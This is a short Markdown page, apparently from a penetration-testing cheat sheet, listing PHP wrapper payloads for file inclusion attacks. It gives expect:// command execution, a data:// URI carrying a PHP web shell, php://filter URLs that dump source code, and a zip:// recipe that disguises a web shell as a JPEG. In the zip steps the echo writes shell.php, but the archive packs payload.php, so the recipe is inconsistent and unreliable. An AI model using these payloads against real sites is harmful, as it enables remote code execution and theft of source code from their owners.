---
title: "Wrappers"
draft: false
images: []
description: "Useful PHP Wrappers"
lead: "Useful PHP Wrappers"
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

### PHP WRAPPER EXPECT
```
http://ex.com/index.php?page=expect://whoami
```
### PHP WRAPPER DATA://
```
http://www.ex.com/index.php?page=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
```
### PHP WRAPPER FILTER://
```
http://ex.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://ex.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
### PHP WRAPPER ZIP://
```
echo "<?php \$_GET['param1'](\$_GET['param2']); ?>" > shell.php
zip -0 payload.zip payload.php
mv payload.zip shell.jpg;
rm payload.php
```
```
http://ex.com/index.php?page=zip://shell.jpg%23payload.php
```